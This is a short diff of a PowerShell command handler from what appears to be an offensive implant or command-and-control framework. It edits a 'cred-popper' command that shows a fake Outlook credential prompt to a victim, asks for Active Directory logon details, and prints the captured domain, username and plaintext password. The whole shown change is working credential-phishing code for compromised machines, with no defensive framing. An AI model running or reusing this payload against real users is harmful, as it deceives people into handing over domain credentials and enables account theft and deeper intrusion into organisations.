@@ -1192,7 +1192,7 @@ param
             }
             if ($pscommand -eq 'cred-popper') 
             {
-                $pscommand = '$test = $Host.ui.PromptForCredential("Outlook requires your credentials","Please enter your active directory logon details:","$env:userdomain\$env:username",""); $test.GetNetworkCredential().username; $test.GetNetworkCredential().password; '
+                $pscommand = '$ps = $Host.ui.PromptForCredential("Outlook requires your credentials","Please enter your active directory logon details:","$env:userdomain\$env:username",""); $user = $ps.GetNetworkCredential().username; $domain = $ps.GetNetworkCredential().domain; $pass = $ps.GetNetworkCredential().password; echo "`nDomain: $domain `nUsername: $user `nPassword: $pass `n"'
                 write-host "This will stall the implant until the user either enter's their credentials or cancel's the popup window"
             }
             if (($pscommand.ToLower().StartsWith('sleep')) -or ($pscommand.ToLower().StartsWith('beacon'))) 
